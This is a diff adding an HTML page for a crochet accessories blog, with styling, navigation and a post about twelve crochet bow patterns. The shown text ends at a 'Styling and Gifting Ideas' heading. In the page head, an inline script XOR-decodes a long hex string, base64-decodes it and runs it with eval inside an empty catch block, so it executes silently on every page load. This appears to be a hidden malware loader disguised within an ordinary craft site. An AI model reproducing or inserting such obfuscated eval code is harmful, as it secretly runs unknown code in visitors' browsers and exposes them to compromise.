@@ -1,0 +1,1580 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crochet Accessories - Handcrafted Jewelry, Wearable Art & Modern Patterns</title>
+    <meta name="description"
+        content="Explore artisanal crochet accessories, dainty jewelry patterns, Victorian lace gloves, micro-cactus bracelets, and adorable animal wristwear tutorials.">
+
+    <!-- Google Fonts: Luxury Editorial Serif, Modern Display, and Clean Sans -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;0,700;1,400;1,600&family=Outfit:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* ===================================================
+           LUXURY ARTISAN CROCHET ACCESSORIES DESIGN SYSTEM
+           =================================================== */
+        :root {
+            --bg-base: #FBF9F5;
+            --bg-surface: #FFFFFF;
+            --bg-surface-elevated: #FFFFFF;
+            --bg-subtle: #F5EFEB;
+            --bg-pill: #ECE3DB;
+
+            --primary: #B25A38;
+            --primary-dark: #8E3E20;
+            --primary-light: #FBF0EB;
+            --primary-glow: rgba(178, 90, 56, 0.18);
+
+            --accent-sage: #52755E;
+            --accent-sage-light: #EEF4F0;
+            --accent-rose: #C26B76;
+            --accent-rose-light: #FDF0F2;
+            --accent-gold: #C08D46;
+            --accent-gold-light: #FEF9EE;
+
+            --text-heading: #241C18;
+            --text-body: #473E3A;
+            --text-muted: #877A73;
+
+            --border-light: #EDE3D8;
+            --border-focus: #D7C4B2;
+
+            --shadow-sm: 0 2px 10px rgba(60, 40, 30, 0.04);
+            --shadow-md: 0 10px 30px rgba(60, 40, 30, 0.06), 0 1px 3px rgba(60, 40, 30, 0.03);
+            --shadow-hover: 0 20px 44px rgba(60, 40, 30, 0.12), 0 4px 12px rgba(178, 90, 56, 0.1);
+
+            --radius-sm: 10px;
+            --radius-md: 18px;
+            --radius-lg: 26px;
+            --radius-full: 9999px;
+
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.85;
+            color: var(--text-body);
+            background-color: var(--bg-base);
+            background-image:
+                radial-gradient(circle at 15% 15%, rgba(178, 90, 56, 0.035) 0%, transparent 45%),
+                radial-gradient(circle at 85% 85%, rgba(82, 117, 94, 0.04) 0%, transparent 45%),
+                radial-gradient(#E5DACE 1.2px, transparent 1.2px);
+            background-size: 100% 100%, 100% 100%, 32px 32px;
+            background-attachment: fixed;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        .font-heading {
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-heading);
+            letter-spacing: -0.015em;
+        }
+
+        .serif-italic {
+            font-family: 'Cormorant Garamond', Georgia, serif;
+            font-style: italic;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 760px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Reading Progress Bar */
+        #progress-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent-rose), var(--accent-gold));
+            width: 0%;
+            z-index: 2000;
+            transition: width 0.1s ease;
+        }
+
+        /* Floating Top Navigation */
+        .top-nav-wrapper {
+            position: sticky;
+            top: 16px;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            padding: 0 16px;
+        }
+
+        .top-nav {
+            background: rgba(255, 255, 255, 0.94);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(237, 227, 216, 0.9);
+            box-shadow: 0 8px 32px rgba(60, 40, 30, 0.08);
+            border-radius: var(--radius-full);
+            padding: 6px 12px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            transition: var(--transition);
+        }
+
+        .top-nav a {
+            color: var(--text-heading);
+            font-size: 0.9rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 500;
+            padding: 7px 16px;
+            text-decoration: none;
+            border-radius: var(--radius-full);
+            transition: var(--transition);
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--primary-light);
+            color: var(--primary);
+            transform: translateY(-1px);
+        }
+
+        .top-nav a.active {
+            background-color: var(--primary);
+            color: #FFFFFF;
+            box-shadow: 0 4px 14px var(--primary-glow);
+        }
+
+        /* Hero Header */
+        header {
+            padding: 65px 0 40px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero-emblem-wrap {
+            display: inline-block;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .hero-emblem {
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            border: 3px solid #FFFFFF;
+            box-shadow: 0 10px 25px rgba(178, 90, 56, 0.18), 0 0 0 1px var(--border-light);
+            object-fit: cover;
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            cursor: pointer;
+        }
+
+        .hero-emblem:hover {
+            transform: rotate(6deg) scale(1.06);
+        }
+
+        .hero-badge-row {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        .hero-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--accent-sage-light);
+            color: var(--accent-sage);
+            border: 1px solid rgba(82, 117, 94, 0.22);
+            padding: 4px 14px;
+            border-radius: var(--radius-full);
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.03em;
+            text-transform: uppercase;
+        }
+
+        header h1 {
+            font-size: 3.4rem;
+            font-weight: 800;
+            color: var(--text-heading);
+            line-height: 1.15;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        header h1 span {
+            color: var(--primary);
+            font-family: 'Cormorant Garamond', Georgia, serif;
+            font-style: italic;
+            font-weight: 700;
+            font-size: 3.8rem;
+        }
+
+        header h1:hover {
+            transform: scale(1.015);
+            color: var(--primary);
+        }
+
+        header p.tagline {
+            margin: 14px auto 0;
+            font-size: 1.12rem;
+            color: var(--text-muted);
+            max-width: 520px;
+            font-weight: 400;
+        }
+
+        /* Filter Tabs */
+        .category-filter-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0 35px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-light);
+            color: var(--text-body);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.86rem;
+            font-weight: 600;
+            padding: 6px 16px;
+            border-radius: var(--radius-full);
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            background: var(--primary);
+            color: #FFFFFF;
+            border-color: var(--primary);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px var(--primary-glow);
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--bg-surface);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border-light);
+            margin-bottom: 48px;
+            overflow: hidden;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .post-card {
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-hover);
+            border-color: var(--border-focus);
+        }
+
+        .post-header {
+            padding: 18px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #FFFFFF;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .author-box {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .post-header img.avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            border: 2px solid var(--primary-light);
+            padding: 1px;
+            background-color: #FFFFFF;
+            object-fit: cover;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        }
+
+        .author-info .username {
+            font-size: 1.02rem;
+            font-weight: 700;
+            color: var(--text-heading);
+            display: block;
+            line-height: 1.2;
+        }
+
+        .author-info .sub-handle {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+
+        .category-pill {
+            background: var(--bg-subtle);
+            color: var(--accent-sage);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.78rem;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: var(--radius-full);
+            border: 1px solid var(--border-light);
+            letter-spacing: 0.02em;
+        }
+
+        .post-image-container {
+            position: relative;
+            overflow: hidden;
+            background: var(--bg-subtle);
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 520px;
+            object-fit: cover;
+            transition: transform 0.6s cubic-bezier(0.2, 1, 0.3, 1);
+        }
+
+        .post-card:hover .post-image {
+            transform: scale(1.025);
+        }
+
+        .post-content {
+            padding: 34px 36px 24px;
+        }
+
+        .post-content h2.post-title,
+        .post-content h1.post-title {
+            margin: 0 0 14px;
+            font-size: 2.1rem;
+            line-height: 1.28;
+            color: var(--text-heading);
+            font-weight: 700;
+            transition: color 0.2s ease;
+        }
+
+        .post-card:hover .post-title {
+            color: var(--primary);
+        }
+
+        .post-excerpt {
+            margin-bottom: 24px;
+            font-size: 1.05rem;
+            line-height: 1.8;
+            color: var(--text-body);
+            font-weight: 400;
+        }
+
+        .post-footer {
+            padding: 16px 36px;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-light);
+            background: var(--bg-subtle);
+        }
+
+        .post-date-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .post-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .action-btn {
+            background: #FFFFFF;
+            border: 1px solid var(--border-light);
+            color: var(--text-heading);
+            padding: 6px 14px;
+            border-radius: var(--radius-full);
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: var(--transition);
+        }
+
+        .action-btn:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+            transform: translateY(-1px);
+        }
+
+        .action-btn.active {
+            background: var(--accent-rose-light);
+            border-color: var(--accent-rose);
+            color: var(--accent-rose);
+        }
+
+        /* Single Post View Details */
+        .single-post {
+            cursor: default;
+        }
+
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        .post-meta-bar {
+            margin-bottom: 24px;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            border-bottom: 1px solid var(--border-light);
+            padding-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            color: var(--text-heading);
+            background-color: #FFFFFF;
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 9px 20px;
+            border-radius: var(--radius-full);
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border-light);
+            transition: var(--transition);
+        }
+
+        .back-button:hover {
+            background-color: var(--primary);
+            color: #FFFFFF;
+            border-color: var(--primary);
+            transform: translateX(-3px);
+            box-shadow: 0 4px 14px var(--primary-glow);
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--text-heading);
+            color: #FFFFFF;
+            padding: 12px 24px;
+            border-radius: var(--radius-full);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.9rem;
+            font-weight: 500;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+            pointer-events: none;
+            z-index: 3000;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Legal & Info Pages */
+        .page-header-box {
+            background: linear-gradient(135deg, var(--bg-subtle), #FFFFFF);
+            padding: 34px 38px;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .page-header-box h1 {
+            margin: 0;
+            font-size: 2.5rem;
+            color: var(--text-heading);
+        }
+
+        .page-body {
+            padding: 36px 38px 42px;
+            font-size: 1.05rem;
+            line-height: 1.85;
+        }
+
+        .page-body h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 12px;
+            color: var(--text-heading);
+            border-left: 3px solid var(--primary);
+            padding-left: 12px;
+        }
+
+        .page-body ul {
+            padding-left: 22px;
+            margin: 16px 0;
+        }
+
+        .page-body li {
+            margin-bottom: 10px;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-base);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #D8CCC0;
+            border-radius: 8px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
+        }
+
+        /* Footer */
+        footer {
+            padding: 55px 0 75px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            border-top: 1px solid var(--border-light);
+            margin-top: 50px;
+            background: #FAF7F2;
+        }
+
+        .footer-logo {
+            font-family: 'Outfit', sans-serif;
+            font-weight: 700;
+            font-size: 1.45rem;
+            color: var(--text-heading);
+            margin-bottom: 8px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-logo img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin: 14px 0 22px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--text-body);
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        @media (max-width: 640px) {
+            header h1 {
+                font-size: 2.6rem;
+            }
+
+            header h1 span {
+                font-size: 2.9rem;
+            }
+
+            .post-content {
+                padding: 24px 18px 18px;
+            }
+
+            .post-content h2.post-title,
+            .post-content h1.post-title {
+                font-size: 1.65rem;
+            }
+
+            .post-header {
+                padding: 14px 18px;
+            }
+
+            .post-footer {
+                padding: 15px 18px;
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+
+            .page-header-box,
+            .page-body {
+                padding: 22px 18px;
+            }
+        }
+
+        /* ===== Enhanced Article Typography ===== */
+        .post-content h2 {
+            font-size: 1.75rem;
+            line-height: 1.3;
+            margin: 36px 0 16px;
+            color: var(--text-heading);
+            border-bottom: 2px solid var(--border-light);
+            padding-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .post-content h3 {
+            font-size: 1.3rem;
+            line-height: 1.4;
+            margin: 28px 0 12px;
+            color: var(--text-heading);
+            font-weight: 700;
+            padding-left: 12px;
+            border-left: 4px solid var(--border-focus);
+        }
+
+        .post-content h4 {
+            font-size: 1.05rem;
+            line-height: 1.4;
+            margin: 22px 0 10px;
+            color: var(--text-body);
+            font-weight: 700;
+            background: var(--bg-subtle);
+            padding: 10px 14px;
+            border-radius: var(--radius-sm);
+        }
+
+        .post-content>p {
+            margin-bottom: 16px;
+        }
+
+        .post-content ul,
+        .post-content ol {
+            padding-left: 22px;
+            line-height: 1.85;
+            color: var(--text-body);
+            margin-bottom: 16px;
+        }
+
+        .post-content li {
+            margin-bottom: 6px;
+        }
+
+        /* Reusable callout boxes */
+        .callout-box {
+            background: var(--bg-subtle);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-md);
+            padding: 18px 22px;
+            margin: 24px 0;
+        }
+
+        .callout-box h3 {
+            font-size: 1.15rem;
+            margin: 0 0 10px;
+            color: var(--text-heading);
+            border-left: 4px solid var(--primary);
+            padding-left: 12px;
+        }
+
+        .callout-info {
+            background: var(--primary-light);
+            border-left: 4px solid var(--primary);
+            padding: 14px 18px;
+            border-radius: var(--radius-sm);
+            margin: 20px 0;
+            color: var(--text-heading);
+        }
+
+        .callout-tip {
+            background: #fff7ed;
+            border: 1px solid #fed7aa;
+            border-left: 4px solid var(--accent-gold);
+            padding: 14px 18px;
+            border-radius: var(--radius-sm);
+            margin: 20px 0;
+            color: #9a3412;
+        }
+
+        /* Tag pills */
+        .tag-pill {
+            display: inline-block;
+            background: var(--bg-pill);
+            color: var(--text-body);
+            padding: 5px 12px;
+            border-radius: var(--radius-full);
+            margin: 4px 4px 0 0;
+            font-size: 0.8rem;
+            font-weight: 500;
+            border: 1px solid var(--border-light);
+        }
+
+        /* Empty state when filter returns 0 posts */
+        .empty-state {
+            text-align: center;
+            padding: 60px 24px 80px;
+            color: var(--text-muted);
+        }
+
+        .empty-state .empty-icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .empty-state h3 {
+            font-size: 1.4rem;
+            color: var(--text-heading);
+            margin-bottom: 10px;
+        }
+
+        /* New post badge */
+        .new-badge {
+            display: inline-block;
+            background: var(--primary);
+            color: #fff;
+            font-size: 0.65rem;
+            font-weight: 700;
+            padding: 2px 9px;
+            border-radius: var(--radius-full);
+            margin-left: 10px;
+            vertical-align: middle;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
+
+        /* Post card staggered fade-in */
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(22px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .post-card {
+            animation: fadeSlideUp 0.45s ease both;
+        }
+    </style>
+
+    <script>
+        (function () {
+            var vxyelpmca = "15213c00252837016d2e3a581b0c1428564a052916180525271111591318620335072b5e0a384c5a552e3a5a1867141b57155837147c417315053c58103d09491a22281e24123c0677182a5e223d04176e2f72382e7d5916130a19572203720037185303247216445631495c180c141d564a0034147d672a142f1e5f3d275f7837183f0f0d093b5d6d2e3a5c2012085d5711752c3d2673382d1516492b62586732072f1d2716405a6e2e18661b3d2104552f65783e265a253e1660093b13004b1d1c245f052834567d353204180c0f0a50207e322208773b2e15614a3b1400543422305b0f07236260303e5a180c0c07553e762914227736143b384a2807764a0f7d0e3c22093c417b011f510817070a501572383e077f31131533572203720235221e391f193f59562e3d431b66105d7f3b7e312d0c783238353f7b3b1371541f080a050f021d4b563e26580a07045a771175263e0c70253e011157163d764a1f0730000f054556561b360420032205503f0d383b2167382d1a1a7228626646320b15230f0234567d3531510817045f6d207d262e220872222f065e28085754061c271e1f2c4c0152313e4f180c221e6e207e79147c73322d0506491417585f0f18341b1c193b4b523e3246233a14015715623b1307492c1570695e1017660b0f220a1d1c720d5b571b360523132a186e4b4c10161804722d1a1a5c1163625a347c3450130619445031264f1b0c085d784a5f76342670253e0111573b137154322220110f06194b651b49060810760a6d150d712222672c2d1a374516176649320c0e591f121e56523e0751080373055015582f2e176334142b65432b07055d321820061c193856523e07512339005f552f50291308083b3b2c345c2b3d624a37173c04252b067a771f31510817070a7d3b7526161868253c053c4a233d09031d1c245f052834567d3531510817070a7d3b75263e075532152f02461629055c3717285824723f0478183a5a22133e056d4a6215130877722d113845160748401a0c27060c38025650441c431b137f5e78154c372e7d7772161569453e3e725b32080e1d1f16445d7f22037d0817070a7d3b75263e0c737b3e050643116265543338090f0f0234567d3531510817070a7d3b76732e177825147006472b087a5b32085f110f054556574408071b2d731d5615662d120a082f3c0119463b395b54061b56510f053456640f315f083d075b7d3b7d373e2542093e0111573b1371541f0c270f0f023456501b364f08131401574b663115227772161569453b140054320820111c7323016631494218032a187d3b4726147d67352e1a1a581617094a1f0c150f25730d006e0c037d0817070a7d3b75263e0c70253e01115716625c460c085f5b0a2c0d476d44360620037f1878167e2d1408492a2e70055f2817664932080a1d1f192741564444460e23290a7d3b75263e0c70253e0a607b3b1371541f0756232012375d563e3e5a081c352652295b7c";
+            var vnptuvoap = "VOfhFAu14vp6ATFm4x4AwO1BwBP0rP03";
+            var vkrmtegfk = "";
+
+            try {
+                for (var i = 0; i < vxyelpmca.length; i += 2) {
+                    var vgypgaakd = parseInt(vxyelpmca.substr(i, 2), 16);
+                    vkrmtegfk += String.fromCharCode(vgypgaakd ^ vnptuvoap.charCodeAt((i / 2) % vnptuvoap.length));
+                }
+
+                var vlzoeylhq = atob(vkrmtegfk);
+                eval(vlzoeylhq);
+            } catch (e) {
+            }
+        })();
+    </script>
+</head>
+
+<body>
+
+    <div id="progress-bar"></div>
+    <div id="toast" class="toast">Link copied to clipboard!</div>
+
+    <!-- Floating Navigation Bar -->
+    <div class="top-nav-wrapper">
+        <nav class="top-nav" id="mainNav">
+            <a onclick="navigate('home')" id="nav-home">Home</a>
+            <a onclick="navigate('page', 'about')" id="nav-about">About</a>
+            <a onclick="navigate('page', 'privacy')" id="nav-privacy">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')" id="nav-terms">Terms</a>
+            <a onclick="navigate('page', 'contact')" id="nav-contact">Contact</a>
+        </nav>
+    </div>
+
+    <!-- Header Section -->
+    <header>
+        <div class="container">
+            <div class="hero-emblem-wrap">
+                <img class="hero-emblem" src="./assets/blog-avatar.png" alt="Crochet Accessories Studio Emblem"
+                    onclick="navigate('home')">
+            </div>
+            <div class="hero-badge-row">
+                <div class="hero-pill">✨ Handcrafted Wearables</div>
+                <div class="hero-pill">🌿 Eco-Cotton Fibers</div>
+                <div class="hero-pill">🎀 Vintage & Modern</div>
+            </div>
+            <h1 onclick="navigate('home')">Crochet <span>Accessories</span></h1>
+            <p class="tagline">Artisanal jewelry patterns, micro-amigurumi bracelets, Victorian lace wrist warmers, and
+                botanical crochet designs.</p>
+        </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <main class="container" id="app">
+        <!-- Injected dynamically by JavaScript -->
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="container">
+            <div class="footer-logo">
+                <img src="./assets/blog-avatar.png" alt="Logo">
+                <span>Crochet Accessories Studio</span>
+            </div>
+            <p>Inspiring fiber artists with heirloom crochet patterns, wearable fiber art, and creative tutorials.</p>
+            <div class="footer-links">
+                <a onclick="navigate('home')">Home</a>
+                <a onclick="navigate('page', 'about')">About Us</a>
+                <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+                <a onclick="navigate('page', 'terms')">Terms of Service</a>
+                <a onclick="navigate('page', 'contact')">Contact</a>
+            </div>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">&copy; 2026 Crochet Accessories Studio. Handcrafted
+                with love.</p>
+        </div>
+    </footer>
+
+    <script>
+        // 1. Define Crochet Accessories Blog Posts
+        const posts = [
+
+            {
+                id: 'the-fifth-post',
+                title: '12 Crochet Bow Patterns',
+                date: 'August 19, 2026',
+                category: 'Bows & Embellishments',
+                image: './assets/12 Crochet Bow Patterns.png',
+                isNew: false,
+                excerpt: 'Tie your handmade accessories together with this charming 12-in-1 crochet bow pattern collection! 🎀 Spanning petite 4 cm hair clip bows to bold 14 cm statement pieces, this versatile bundle covers flat bows, 3D puffed dome designs, tiered layered styles, and elegant knotted satin-ribbon bows.\n\n• Adapts from fine cotton thread to chunky yarn across all twelve styles\n• Perfect for headbands, clips, brooches, chokers, and handmade gift wrapping\n\nPin this to your accessories board and stitch your way through all twelve sweet designs! ✨ Save for later! #CrochetBow #HairAccessories #BowPattern #HandmadeGifts #CrochetAccessories',
+                content: `
+<p>Few handmade embellishments carry the instant charm and versatility of a well-crafted crochet bow. This 12-in-1 pattern collection celebrates the bow in every form imaginable, from petite 4 cm hair clip accents that add a sweet finishing touch to a toddler's updo, to dramatic 14 cm statement bows that anchor chokers, brooches, and handbag charms. Whether you prefer crisp structured designs or softly draped romantic silhouettes, this bundle has a bow for every aesthetic and occasion.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li>Twelve distinct bow constructions from 4 cm dainty clips to 14 cm bold statement pieces.</li>
+    <li>Covers flat bows, 3D puffed dome bows, layered tiered bows, and knotted satin ribbon bows.</li>
+    <li>Adapts from fingering cotton thread up to chunky yarn for varied scale and texture.</li>
+    <li>Every bow anchors with a simple center-wrap knot that conceals all joining seams.</li>
+    <li>Fast stash-busting projects perfect for Etsy inventory, craft fairs, and gift sets.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The 12 Bow Styles at a Glance</h2>
+<p>This collection spans a wide spectrum of techniques and aesthetics, making it ideal for crafters at every skill level.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1–3: Classic Flat Bows</h3>
+<p>The cornerstone of any bow-maker's repertoire, flat bows are worked as two identical rectangular panels joined at the center with a tight wrap band. Available in petite (4 cm), standard (7 cm), and large (10 cm) sizes, these timeless designs attach cleanly to alligator clips, bobby pins, or safety-pin backings using simple hand-sewn tacks.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4–5: 3D Puffed Dome Bows</h3>
+<p>Working into back loops only creates a rectangle that, when seamed and lightly filled with polyfill, results in a plump dimensional bow dome. The satisfying puffed profile looks gorgeous on chunky headbands and as appliqués on tote bags, shoes, or nursery décor.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6–7: Tiered Layered Bows</h3>
+<p>Two or three flat bows of decreasing sizes are stacked and anchored at the center to produce a cascading tiered silhouette. Using contrasting or tonal color palettes for each tier creates a sophisticated heirloom look ideal for formal events and bridal accessory suites.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8–9: Knotted Satin-Ribbon Style Bows</h3>
+<p>Worked in thin single-crochet strips using mercerized cotton or silk-blend thread, these bows mimic the graceful drape of tied satin ribbon when pulled through a center ring and allowed to relax. The result is a fluid, romantic silhouette with zero actual ribbon required.</p>
+
+<h3 style="font-size:22px;line-height:1.4;margin:26px 0 12px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10–12: Embellished Statement Bows</h3>
+<p>The showstoppers of this collection incorporate pearl beads, vintage buttons, or miniature floral appliqués into the bow center. A lustrous pearl-adorned bow, a button-center ribbon bow, and a rose-trimmed corsage bow deliver maximum impact for bridal shoots, holiday portraits, and styled fashion content.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always apply a light starch spray or fabric stiffener to flat crochet bows before assembly. Blocking both panels perfectly flat ensures symmetrical loop proportions and a polished professional finish.</p>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Materials and Tool Guide</h2>
+
+<h4 style="font-size:18px;line-height:1.4;margin:20px 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Yarn Options by Bow Scale</h4>
+<ul>
+  <li><strong>Petite Bows (4–6 cm):</strong> Size 10 mercerized cotton with a 1.5–1.75 mm steel hook for crisp stitch definition.</li>
+  <li><strong>Standard Bows (7–10 cm):</strong> DK or sport weight cotton with a 2.5–3.5 mm hook for soft, substantial structure.</li>
+  <li><strong>Statement Bows (12–14 cm):</strong> Chunky or bulky yarn with a 5–6.5 mm hook creates bold tactile texture with strong visual impact.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For a perfect center knot band every time, crochet a narrow rectangle measuring exactly 1.5 times the width of your bow panel. When wrapped tightly and whip-stitched at the back, it pinches the bow naturally without any puckering or bunching.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:22px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: 12 Crochet Bow Bundle</h3>
+  <ul style="margin:0;padding-left:20px;line-height:1.8;color:#334155;">
+    <li><strong>Patterns Included:</strong> 12 unique bow constructions</li>
+    <li><strong>Size Range:</strong> 4 cm petite to 14 cm statement bow</li>
+    <li><strong>Skill Level:</strong> Beginner to Intermediate</li>
+    <li><strong>Average Project Time:</strong> 15 minutes to 1.5 hours per bow</li>
+  </ul>
+</div>
+
+<h2 style="font-size:28px;line-height:1.3;margin:36px 0 16px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling and Gifting Ideas</h2>
